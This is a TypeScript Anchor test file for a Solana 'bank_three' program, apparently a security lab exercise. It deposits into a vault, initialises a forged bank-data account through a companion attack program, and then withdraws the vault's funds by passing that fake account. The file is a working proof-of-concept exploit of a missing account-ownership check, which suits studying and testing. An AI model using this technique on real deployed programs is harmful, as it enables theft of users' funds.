import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankThree } from "../target/types/bank_three";
import { Anchor12Attack } from "../target/types/anchor12_attack";
import { assert } from "chai";

describe("bank_three attack", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const payer = provider.wallet.payer!;

  const program = anchor.workspace.bank_three as Program<BankThree>;
  const program_attack = anchor.workspace.anchor12_attack as Program<Anchor12Attack>;
  let amount;
  const autority = anchor.web3.Keypair.generate();
  const bank_data = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("bank")],
    program.programId
  )[0];
  const vault_account = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("vault")],
    program.programId
  )[0];
  const bank_data_attack = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("bank")],
    program_attack.programId
  )[0];

  before(async()=>{
    const tx = new anchor.web3.Transaction().add(anchor.web3.SystemProgram.transfer({
      fromPubkey: payer.publicKey,
      toPubkey: autority.publicKey,
      lamports: anchor.web3.LAMPORTS_PER_SOL
    }));
    await provider.sendAndConfirm(tx, [payer]);
    amount = new anchor.BN(await provider.connection.getMinimumBalanceForRentExemption(0));
  });

  it("Deposit", async () => {
    // Add your test here.
    await program.methods
      .deposit(amount)
      .accounts({ authority: autority.publicKey })
      .signers([autority])
      .rpc({commitment: "confirmed"});
    const vault_balance = await provider.connection.getBalance(vault_account, "confirmed");
    assert(vault_balance.toString() == amount.toString());
  });

  it("Setup Attack Bank Data", async()=>{
    await program_attack.methods.initialize(vault_account)
      .accounts({fakeAuthority: payer.publicKey})
      .signers([payer]).rpc({commitment: "confirmed"});
    const bank_data_attack_fetch = await program_attack.account.bank.fetchNullable(bank_data_attack, "confirmed");
    assert(bank_data_attack_fetch != null);
  });

  it("Withdraw", async () => {
    const vault_balance_before = await provider.connection.getBalance(vault_account);
    // attack the bank_data field with bank_data_attack.
    // withdraw from the bank.
    await program.methods.withdraw(amount).accounts({
      authority: payer.publicKey,
      bankData: bank_data_attack
    }).signers([payer]).rpc({commitment: "confirmed"});
    const vault_balance_after = await provider.connection.getBalance(vault_account);
    assert(amount.add(new anchor.BN(vault_balance_after)).eq(new anchor.BN(vault_balance_before)));
  });
});
